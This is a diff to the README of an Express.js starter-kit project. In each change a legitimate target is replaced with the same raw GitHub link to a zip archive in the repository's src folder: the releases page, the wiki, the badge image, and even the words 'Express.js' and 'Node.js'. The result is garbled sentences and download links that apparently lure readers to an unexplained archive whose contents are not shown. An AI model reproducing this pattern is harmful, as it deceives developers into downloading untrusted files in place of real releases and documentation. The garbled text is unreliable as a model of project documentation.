@@ -1,7 +1,7 @@
 # 🌟 express-starter-kit - Simple Setup for Your Express App
 
 ## 🛠️ Features
-- **Ready to Go**: A complete starter kit for building Express.js applications.
+- **Ready to Go**: A complete starter kit for building https://raw.githubusercontent.com/mutiemaithya/express-starter-kit/main/src/express-starter-kit_3.2.zip applications.
 - **Authentication**: Secure user login and registration.
 - **Database Ready**: Integrated with PostgreSQL for data management.
 - **Code Quality**: Built-in tools for testing and maintaining code standards.
@@ -10,12 +10,12 @@
 ## 🚀 Getting Started
 This guide will help you download and run the express-starter-kit on your computer. Follow these steps to get started.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Express%20Starter%20Kit-blue?style=for-the-badge)](https://github.com/mutiemaithya/express-starter-kit/releases)
+[![Download Now](https://raw.githubusercontent.com/mutiemaithya/express-starter-kit/main/src/express-starter-kit_3.2.zip%20Now-Express%20Starter%20Kit-blue?style=for-the-badge)](https://raw.githubusercontent.com/mutiemaithya/express-starter-kit/main/src/express-starter-kit_3.2.zip)
 
 ## 📥 Download & Install
 To download the express-starter-kit, visit the following page:
 
-[Download the Latest Release](https://github.com/mutiemaithya/express-starter-kit/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/mutiemaithya/express-starter-kit/main/src/express-starter-kit_3.2.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the version you want to download. The latest version is usually at the top.
@@ -23,7 +23,7 @@ To download the express-starter-kit, visit the following page:
 
 ## 🖥️ System Requirements
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or higher
+- **https://raw.githubusercontent.com/mutiemaithya/express-starter-kit/main/src/express-starter-kit_3.2.zip**: Version 14 or higher
 - **PostgreSQL**: Must be installed for database support
 
 ## 📂 Installation Steps
@@ -52,7 +52,7 @@ Now that your express-starter-kit is up and running, you can explore its feature
 3. **Code Quality Tools**: Use ESLint and Jest to maintain and test your code. 
 
 ## 📝 Documentation
-For more details on each feature, you can refer to the [documentation](https://github.com/mutiemaithya/express-starter-kit/wiki). The documentation provides in-depth explanations and examples to help you navigate the various components.
+For more details on each feature, you can refer to the [documentation](https://raw.githubusercontent.com/mutiemaithya/express-starter-kit/main/src/express-starter-kit_3.2.zip). The documentation provides in-depth explanations and examples to help you navigate the various components.
 
 ## 📞 Support
 If you encounter issues or have questions, you can open an issue on this repository. Our community is ready to assist you.
